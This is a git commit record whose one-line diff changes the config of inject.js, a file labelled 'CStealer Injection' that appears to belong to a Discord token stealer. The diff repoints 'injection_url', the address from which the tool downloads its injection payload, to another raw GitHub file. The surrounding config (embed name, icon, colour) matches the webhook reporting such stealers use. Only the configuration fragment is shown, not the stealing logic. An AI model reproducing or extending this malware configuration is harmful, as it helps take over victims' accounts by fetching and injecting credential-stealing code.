3dcf05415623fdb484d3109eecc85389726546cf
el4vdev <163694068+el4vdev@users.noreply.github.com>
2024-03-17 00:50:43 +0100

    Update inject.js

--- inject.js
+++ inject.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'CStealer Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/shitcord-devs/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/shitcord-devs/shitcord/main/inject.js', 
   /**
    
    **/
